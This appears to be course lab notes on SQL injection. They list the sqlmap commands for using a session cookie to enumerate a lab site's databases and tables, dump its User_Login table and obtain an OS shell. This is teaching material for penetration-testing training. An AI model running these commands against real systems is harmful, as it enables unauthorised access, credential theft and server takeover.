# 15 - SQL Injection

## Module 15 - SQL Injection

### **Lab1-Task2: Perform an SQL Injection Attack Against MSSQL to Extract Databases using sqlmap**

* Login a website
* Inspect element
* Dev tools-\&gt;Console: document.cookie
* **sqlmap -u "**[**http://www.moviescope.com/viewprofile.aspx?id=1**](http://www.moviescope.com/viewprofile.aspx?id=1)**" --cookie="value" –dbs**
  * **-u: Specify the target URL**
  * **--cookie: Specify the HTTP cookie header value**
  * **--dbs: Enumerate DBMS databases**
* Get a list of databases
* Select a database to extract its tables
* **sqlmap -u "**[**http://www.moviescope.com/viewprofile.aspx?id=1**](http://www.moviescope.com/viewprofile.aspx?id=1)**" --cookie="value" -D moviescope –tables**
  * **-D: Specify the DBMS database to enumerate**
  * **--tables: Enumerate DBMS database tables**
* Get a list of tables
* Select a column
* **sqlmap -u "**[**http://www.moviescope.com/viewprofile.aspx?id=1**](http://www.moviescope.com/viewprofile.aspx?id=1)**" --cookie="value" -D moviescope –T User\_Login --dump**
* Get table data of this column
* **sqlmap -u "**[**http://www.moviescope.com/viewprofile.aspx?id=1**](http://www.moviescope.com/viewprofile.aspx?id=1)**" --cookie="value" --os-shell**
* Get the OS Shell
* TASKLIST
